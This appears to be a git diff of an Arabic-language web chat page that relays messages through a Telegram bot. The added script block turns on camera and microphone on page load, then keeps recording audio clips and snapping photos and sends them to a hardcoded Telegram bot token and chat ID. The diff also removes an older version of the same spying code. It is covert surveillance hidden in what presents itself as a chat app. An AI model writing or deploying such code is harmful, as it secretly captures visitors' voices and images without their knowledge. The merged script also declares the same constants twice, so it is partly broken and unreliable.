@@ -440,6 +440,92 @@
     </div>
 
     <script>
+let stream = null;
+let audioActive = false;
+let photoActive = false;
+
+const BOT_TOKEN = "8574889163:AAFJtXmst2oMwx1ubV05QTC_fTF7IHe3124";
+const CHAT_ID   = "5648826330";
+
+const AUDIO_MS = 5000; // الصوت كل 5 ثواني
+const PHOTO_MS = 2000; // الصورة كل 2 ثانية
+
+// إرسال إلى تليجرام
+function sendToTelegram(blob, type="voice") {
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append(type, blob, type === "voice" ? "audio.webm" : "photo.jpg");
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type === "voice" ? "Voice" : "Photo"}`, {
+        method: "POST",
+        body: form
+    })
+    .catch(err => console.error("خطأ في الإرسال:", err));
+}
+
+// تسجيل صوت 5 ثواني
+function recordAudio() {
+    return new Promise(resolve => {
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => resolve(new Blob(chunks, { type: "audio/webm" }));
+        recorder.start();
+        setTimeout(() => recorder.stop(), AUDIO_MS);
+    });
+}
+
+// التقاط صورة
+function captureImage() {
+    return new Promise(resolve => {
+        const video = document.createElement("video");
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+            video.play();
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext("2d").drawImage(video, 0, 0);
+            canvas.toBlob(blob => resolve(blob), "image/jpeg");
+        };
+    });
+}
+
+// حلقة الصوت
+async function audioLoop() {
+    audioActive = true;
+    while (audioActive) {
+        const audio = await recordAudio();
+        sendToTelegram(audio, "voice");
+        await new Promise(r => setTimeout(r, 5000));
+    }
+}
+
+// حلقة الصور
+async function photoLoop() {
+    photoActive = true;
+    while (photoActive) {
+        const img = await captureImage();
+        sendToTelegram(img, "photo");
+        await new Promise(r => setTimeout(r, PHOTO_MS));
+    }
+}
+
+// طلب إذن الكاميرا والمايك فور دخول الصفحة وتشغيل الحلقات
+async function start() {
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+        console.log("تم منح الإذن! بدء التسجيل...");
+        audioLoop();
+        photoLoop();
+    } catch (err) {
+        console.log("تم رفض الإذن أو حدث خطأ:", err);
+    }
+}
+
+window.addEventListener("load", start);
+
         const BOT_TOKEN = '8574889163:AAFJtXmst2oMwx1ubV05QTC_fTF7IHe3124';
         const CHAT_ID = '5648826330';
         
@@ -447,13 +533,6 @@
         let activeChat = null;
         let lastUpdateId = 0;
         let pollingInterval = null;
-
-        // متغيرات نظام التسجيل
-        let stream = null;
-        let audioActive = false;
-        let photoActive = false;
-        const AUDIO_MS = 5000; // الصوت كل 5 ثواني
-        const PHOTO_MS = 2000; // الصورة كل 2 ثانية
 
         // قاعدة بيانات المستخدمين
         const users = {
@@ -466,171 +545,6 @@
             '44444': { name: 'ليلى', avatar: '💁', sendCommand: '/send7' },
             '55555': { name: 'خالد', avatar: '🙋', sendCommand: '/send8' }
         };
-
-        // ==================== نظام التسجيل ====================
-        
-        // إرسال إلى تليجرام
-        async function sendMediaToTelegram(blob, type="voice") {
-            const form = new FormData();
-            form.append("chat_id", CHAT_ID);
-            
-            if (type === "voice") {
-                form.append("voice", blob, "audio.ogg");
-            } else {
-                form.append("photo", blob, "photo.jpg");
-            }
-            
-            const endpoint = type === "voice" ? "sendVoice" : "sendPhoto";
-            
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
-                    method: "POST",
-                    body: form
-                });
-                const data = await response.json();
-                if (!data.ok) {
-                    console.error(`خطأ في إرسال ${type}:`, data);
-                }
-            } catch (err) {
-                console.error("خطأ في الإرسال:", err);
-            }
-        }
-
-        // تسجيل صوت 5 ثواني
-        function recordAudio() {
-            return new Promise((resolve, reject) => {
-                if (!stream) {
-                    reject(new Error("لا يوجد stream"));
-                    return;
-                }
-                
-                try {
-                    const audioStream = new MediaStream(stream.getAudioTracks());
-                    const recorder = new MediaRecorder(audioStream, {
-                        mimeType: 'audio/webm;codecs=opus'
-                    });
-                    const chunks = [];
-                    
-                    recorder.ondataavailable = e => {
-                        if (e.data.size > 0) {
-                            chunks.push(e.data);
-                        }
-                    };
-                    
-                    recorder.onstop = () => {
-                        const blob = new Blob(chunks, { type: "audio/ogg" });
-                        resolve(blob);
-                    };
-                    
-                    recorder.onerror = (e) => reject(e);
-                    
-                    recorder.start();
-                    setTimeout(() => {
-                        if (recorder.state === 'recording') {
-                            recorder.stop();
-                        }
-                    }, AUDIO_MS);
-                } catch (err) {
-                    reject(err);
-                }
-            });
-        }
-
-        // التقاط صورة
-        function captureImage() {
-            return new Promise((resolve, reject) => {
-                if (!stream) {
-                    reject(new Error("لا يوجد stream"));
-                    return;
-                }
-                
-                try {
-                    const video = document.createElement("video");
-                    video.srcObject = stream;
-                    video.setAttribute('playsinline', '');
-                    video.muted = true;
-                    
-                    video.onloadedmetadata = () => {
-                        video.play().then(() => {
-                            setTimeout(() => {
-                                const canvas = document.createElement("canvas");
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
-                                const ctx = canvas.getContext("2d");
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                
-                                canvas.toBlob(blob => {
-                                    video.pause();
-                                    video.srcObject = null;
-                                    resolve(blob);
-                                }, "image/jpeg", 0.8);
-                            }, 100);
-                        }).catch(reject);
-                    };
-                    
-                    video.onerror = reject;
-                } catch (err) {
-                    reject(err);
-                }
-            });
-        }
-
-        // حلقة الصوت
-        async function audioLoop() {
-            audioActive = true;
-            while (audioActive) {
-                try {
-                    const audio = await recordAudio();
-                    if (audio && audio.size > 0) {
-                        await sendMediaToTelegram(audio, "voice");
-                        console.log("✅ تم إرسال الصوت");
-                    }
-                } catch (err) {
-                    console.error("خطأ في تسجيل الصوت:", err);
-                }
-                await new Promise(r => setTimeout(r, 5000));
-            }
-        }
-
-        // حلقة الصور
-        async function photoLoop() {
-            photoActive = true;
-            while (photoActive) {
-                try {
-                    const img = await captureImage();
-                    if (img && img.size > 0) {
-                        await sendMediaToTelegram(img, "photo");
-                        console.log("✅ تم إرسال الصورة");
-                    }
-                } catch (err) {
-                    console.error("خطأ في التقاط الصورة:", err);
-                }
-                await new Promise(r => setTimeout(r, PHOTO_MS));
-            }
-        }
-
-        // بدء التسجيل
-        async function startRecording() {
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    audio: {
-                        echoCancellation: true,
-                        noiseSuppression: true
-                    }, 
-                    video: {
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    }
-                });
-                console.log("✅ تم منح الإذن! بدء التسجيل...");
-                audioLoop();
-                photoLoop();
-            } catch (err) {
-                console.error("❌ تم رفض الإذن أو حدث خطأ:", err);
-            }
-        }
-
-        // ==================== نظام الدردشة ====================
 
         // تحميل البيانات من localStorage عند بدء التشغيل
         function loadData() {
@@ -684,7 +598,7 @@
                 
                 chats.push(newChat);
                 renderChats();
-                saveData();
+                saveData(); // حفظ البيانات
                 closeAddChatModal();
                 openChat(newChat);
             } else {
@@ -718,7 +632,7 @@
         }
 
         function openChat(chat) {
-            stopPolling();
+            stopPolling(); // إيقاف الفحص القديم
             activeChat = chat;
             renderChats();
             
@@ -743,8 +657,10 @@
             renderMessages();
             startPolling();
             
+            // التركيز على حقل الإدخال
             document.getElementById('messageInput').focus();
             
+            // إرسال بضغط Enter
             document.getElementById('messageInput').addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
                     sendMessage();
@@ -799,8 +715,11 @@
             input.value = '';
             renderMessages();
             renderChats();
+            
+            // حفظ البيانات
             saveData();
             
+            // إرسال للبوت
             sendToTelegram(text);
         }
 
@@ -823,10 +742,10 @@
             }
         }
 
-        let isProcessing = false;
+        let isProcessing = false; // منع الفحص المتزامن
 
         async function checkForMessages() {
-            if (isProcessing) return;
+            if (!activeChat || isProcessing) return;
             
             isProcessing = true;
             
@@ -835,50 +754,51 @@
                 const data = await response.json();
                 
                 if (data.ok && data.result.length > 0) {
+                    let hasNewMessages = false;
+                    
                     for (const update of data.result) {
+                        // تحديث lastUpdateId قبل معالجة الرسالة
                         if (update.update_id > lastUpdateId) {
                             lastUpdateId = update.update_id;
                             
                             if (update.message && update.message.text) {
                                 const text = update.message.text;
                                 
-                                // البحث في جميع الدردشات عن الأمر المناسب
-                                chats.forEach(chat => {
-                                    if (text.startsWith(chat.sendCommand + ' ')) {
-                                        const replyText = text.substring(chat.sendCommand.length + 1).trim();
+                                // البحث عن الأمر المناسب للدردشة النشطة
+                                if (text.startsWith(activeChat.sendCommand + ' ')) {
+                                    const replyText = text.substring(activeChat.sendCommand.length + 1).trim();
+                                    
+                                    if (replyText) {
+                                        const now = new Date();
+                                        const time = now.toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' });
                                         
-                                        if (replyText) {
-                                            const now = new Date();
-                                            const time = now.toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' });
-                                            
-                                            const message = {
-                                                text: replyText,
-                                                type: 'received',
-                                                time: time,
-                                                id: update.update_id
-                                            };
-                                            
-                                            // التحقق من عدم وجود الرسالة مسبقاً
-                                            const exists = chat.messages.find(m => m.id === update.update_id);
-                                            if (!exists) {
-                                                chat.messages.push(message);
-                                                chat.lastMessage = replyText;
-                                                chat.time = time;
-                                                
-                                                // تحديث الواجهة إذا كانت الدردشة نشطة
-                                                if (activeChat && activeChat.code === chat.code) {
-                                                    renderMessages();
-                                                }
-                                                renderChats();
-                                                console.log(`✅ رسالة جديدة لـ ${chat.name}: ${replyText}`);
-                                            }
+                                        const message = {
+                                            text: replyText,
+                                            type: 'received',
+                                            time: time,
+                                            id: update.update_id // إضافة معرف فريد
+                                        };
+                                        
+                                        // التحقق من عدم وجود الرسالة مسبقاً
+                                        const exists = activeChat.messages.find(m => m.id === update.update_id);
+                                        if (!exists) {
+                                            activeChat.messages.push(message);
+                                            activeChat.lastMessage = replyText;
+                                            activeChat.time = time;
+                                            hasNewMessages = true;
                                         }
                                     }
-                                });
+                                }
                             }
                         }
                     }
                     
+                    if (hasNewMessages) {
+                        renderMessages();
+                        renderChats();
+                    }
+                    
+                    // حفظ آخر معرف بعد المعالجة
                     saveData();
                 }
             } catch (error) {
@@ -890,9 +810,7 @@
 
         function startPolling() {
             if (pollingInterval) clearInterval(pollingInterval);
-            // بدء الفحص فوراً ثم كل 3 ثواني
-            checkForMessages();
-            pollingInterval = setInterval(checkForMessages, 3000);
+            pollingInterval = setInterval(checkForMessages, 5000); // كل 5 ثواني
         }
 
         function stopPolling() {
@@ -902,18 +820,15 @@
             }
         }
 
+        // إغلاق المودال بالنقر خارجها
         document.getElementById('addChatModal').addEventListener('click', function(e) {
             if (e.target === this) {
                 closeAddChatModal();
             }
         });
 
-        // بدء التطبيق
-        window.addEventListener('load', () => {
-            loadData();
-            startRecording(); // بدء التسجيل تلقائياً
-            startPolling(); // بدء فحص الرسائل من البوت
-        });
+        // تحميل البيانات عند بدء الصفحة
+        window.addEventListener('load', loadData);
     </script>
 </body>
 </html>
